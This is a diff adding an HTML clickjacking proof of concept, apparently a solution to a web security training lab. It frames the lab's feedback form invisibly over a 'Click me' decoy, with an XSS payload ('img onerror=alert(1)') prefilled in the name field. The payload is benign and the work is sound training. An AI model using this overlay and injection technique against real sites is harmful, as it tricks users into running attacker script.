@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        #target_website {
+            position: relative;
+            width: 1000px;
+            height: 700px;
+            opacity: 0.00001;
+            z-index: 2;
+        }
+        
+        div {
+            position: absolute;
+            top: 500px;
+            left: 60px;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+    <div>Click me</div>
+    <iframe id="target_website" src="https://0a3900c304b67111838b512800a90077.web-security-academy.net/feedback?name=%3Cimg%20src%3D1%20onerror%3Dalert(1)%3E&email=test%40test.com&subject=test&message=test"></iframe>
+</body>
+</html>
